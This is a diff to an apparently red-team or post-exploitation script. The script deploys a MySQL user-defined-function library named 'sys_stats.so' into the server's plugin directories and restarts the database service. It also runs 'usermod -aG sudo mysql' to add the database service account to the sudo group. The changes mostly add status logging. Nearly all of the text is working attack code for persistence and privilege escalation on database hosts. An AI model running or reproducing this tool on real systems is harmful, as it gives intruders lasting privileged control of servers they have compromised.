@@ -1,4 +1,5 @@
 def deploy_udf():
+    print("[+] Starting UDF deployment process...")
     paths = [
         "/usr/lib/mysql/plugin/",
         "/usr/lib64/mysql/plugin/",
@@ -6,46 +7,76 @@ def deploy_udf():
         "/usr/libexec/mysql/plugin/"
     ]
 
+    print("[+] Checking possible MySQL plugin directories...")
     for path in paths:
         if file.is_dir(path):
-            print("Deploying UDF to " + path)
-            assets.copy("deploy_UDF_mysql/assets/sys_stats.so", f"{path}/sys_stats.so") 
+            print(f"[+] Found valid plugin directory: {path}")
+            print(f"[+] Deploying UDF to {path}")
+            assets.copy("deploy_UDF_mysql/assets/sys_stats.so", f"{path}/sys_stats.so")
+            print(f"[+] Successfully copied sys_stats.so to {path}")
             return True
+    
+    print("[-] No valid MySQL plugin directories found")
+    return False
 
 
 def is_using_systemd():
-    print("Checking if systemd is used")
+    print("[+] Checking if system uses systemd...")
     command_get_res = sys.shell("command -v systemctl")
     
     if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
-        print("Systemd is used")
+        print("[+] systemctl found on system")
         for canary in ["/run/systemd/system/", "/dev/.run/systemd/", "/dev/.systemd/"]:
             if file.is_dir(canary):
-                print("Systemd is used")
+                print(f"[+] Confirmed systemd is used (found directory: {canary})")
                 return True
+        print("[-] systemctl found but no systemd directories detected")
+    else:
+        print("[-] systemctl not found, system likely not using systemd")
     return False
 
 def is_using_sysvinit():
+    print("[+] Checking if system uses sysvinit...")
     command_get_res = sys.shell("command -v update-rc.d")
     if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
+        print("[+] Confirmed system is using sysvinit")
         return True
+    print("[-] System does not appear to be using sysvinit")
     return False
 
 def add_sudo_user():
-    sys.shell("usermod -aG sudo mysql || usermod -aG sudo mariadb")
+    print("[+] Attempting to add MySQL/MariaDB user to sudo group...")
+    result = sys.shell("usermod -aG sudo mysql || usermod -aG sudo mariadb")
+    if result['status'] == 0:
+        print("[+] Successfully added database user to sudo group")
+    else:
+        print(f"[-] Failed to add database user to sudo group: {result['stderr']}")
 
 def main():
-    print("Deploying UDF to MySQL")
+    print("[+] Starting MySQL UDF deployment process")
     if deploy_udf():
-        print("Deployed UDF")
+        print("[+] UDF deployment successful")
+        
         if is_using_systemd():
-            print("Systemd is used")
-            sys.shell("systemctl restart mysql || systemctl restart mariadb")
+            print("[+] Attempting to restart MySQL/MariaDB service using systemd...")
+            result = sys.shell("sudo systemctl restart mysql || sudo systemctl restart mariadb")
+            if result['status'] == 0:
+                print("[+] Successfully restarted database service using systemd")
+            else:
+                print(f"[-] Failed to restart database service: {result['stderr']}")
         elif is_using_sysvinit():
-            print("Sysvinit is used")
-            sys.shell("service mysql restart || service mariadb restart")
+            print("[+] Attempting to restart MySQL/MariaDB service using sysvinit...")
+            result = sys.shell("sudo service mysql restart || sudo service mariadb restart")
+            if result['status'] == 0:
+                print("[+] Successfully restarted database service using sysvinit")
+            else:
+                print(f"[-] Failed to restart database service: {result['stderr']}")
+        else:
+            print("[-] Could not determine init system, skipping service restart")
+            
         add_sudo_user()
+        print("[+] UDF deployment completed")
     else: 
-        print("Failed to deploy UDF")
+        print("[-] Failed to deploy UDF, aborting operation")
 
 main()
